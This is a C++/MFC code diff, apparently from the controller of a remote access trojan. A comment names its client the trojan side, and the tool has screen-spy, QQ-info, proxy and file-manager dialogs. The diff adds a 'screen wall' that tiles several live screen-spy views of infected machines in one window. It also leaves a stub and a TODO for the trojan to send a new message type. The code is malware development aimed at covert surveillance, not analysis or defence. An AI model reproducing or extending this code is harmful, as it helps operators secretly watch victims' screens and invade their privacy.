@@ -26,6 +26,7 @@
 #include "TextChatDlg.h"
 #include "QQInfoDlg.h"
 #include "ProxyMapDlg.h"
+#include "ScreenSpyDlgSmall.h"
 
 
 /////////////////////////////////////////
@@ -158,6 +159,19 @@ static UINT indicators[] =
 	ID_STAUTSPORT,
 };
 
+static UINT staticList[] =
+{
+	IDC_STATIC0,
+	IDC_STATIC1,
+	IDC_STATIC2,
+	IDC_STATIC3,
+	IDC_STATIC4,
+	IDC_STATIC5,
+	IDC_STATIC6,
+	IDC_STATIC7,
+	IDC_STATIC8
+};
+
 /////////////////////////////////////////////////////////////////////////////
 // CMainFrame construction/destruction
 
@@ -202,6 +216,7 @@ CMainFrame::CMainFrame()
 	m_strIniFileName = szStylesPath;
 	
 	m_nColumns = 0;
+	m_nWallCount = 0;
 	
 	m_pItemsShapes = 0;
 	m_pItemsStyles = 0;
@@ -1032,6 +1047,7 @@ void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
 		break;
 	case TOKEN_DRIVE_LIST: // 文件管理 驱动器列表
 		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
+		//# TODO 这个问题 ↑ 有空我会来解决 
 		g_pFrame->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
 		break;
 	case TOKEN_BITMAPINFO: // 屏幕查看
@@ -1469,11 +1485,22 @@ void CMainFrame::OnVideoWall()
 {
 	//AfxMessageBox("启动视频墙");
 	
+	m_dlgVideo.GetActiveWindow();
+
+	if(NULL != m_dlgVideo){
+
+		//AfxMessageBox("只能同时启动一个屏幕墙");
+		m_dlgVideo.ShowWindow(SW_SHOW);
+		//delete m_dlgVideo;
+
+	}
+	else{
+	
 	m_dlgVideo.Create(IDD_VIDEOWALL);
 
 	m_dlgVideo.CenterWindow();
 	m_dlgVideo.ShowWindow(SW_SHOW);
-
+	}
 	
 }
 
@@ -1508,18 +1535,56 @@ LRESULT CMainFrame::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
 	return 0;
 }
 
+
 LRESULT CMainFrame::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
 {
+	//检查是否已经启动过了，同时只能存在一个屏幕墙
+
+	
+
+
+	//AfxMessageBox("Start sCreen Share");
 	ClientContext *pContext = (ClientContext *)lParam;
 	
-	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
+	CScreenSpyDlgSmall	*dlg = new CScreenSpyDlgSmall(this, m_iocpServer, pContext);
+
+
+
+
+	CRect IFramerect;
+    CStatic* pStatic;
+	pStatic = (CStatic*)m_dlgVideo.GetDlgItem(staticList[m_nWallCount]);
+    //pStatic = (CStatic*)GetDlgItem(IDC_STATIC);
+
+
+
+
 	// 设置父窗口为卓面
-	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
+	//dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
+	dlg->Create(IDD_SCREENSPY_SMALL,pStatic);
+	dlg->GetWindowRect(IFramerect);
+	dlg->SetWindowPos(&wndTop, 0, 0, IFramerect.Width(), IFramerect.Height(), SWP_SHOWWINDOW);
     dlg->ShowWindow(SW_SHOW);
+	m_nWallCount++;
 	
 	
 	pContext->m_Dialog[0] = SCREENSPY_DLG;
 	pContext->m_Dialog[1] = (int)dlg;
+	return 0;
+}
+//#TODO 屏幕墙功能开发
+//小马端那边要发送一个新的枚举
+LRESULT CMainFrame::OnAddToScreenWall(WPARAM wParam, LPARAM lParam)
+{
+	//ClientContext *pContext = (ClientContext *)lParam;
+	//
+	//CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
+	//// 设置父窗口为卓面
+	//dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
+	//dlg->ShowWindow(SW_SHOW);
+	//
+	//pContext->m_Dialog[0] = SCREENSPY_DLG;
+	//pContext->m_Dialog[1] = (int)dlg;
 	return 0;
 }
 
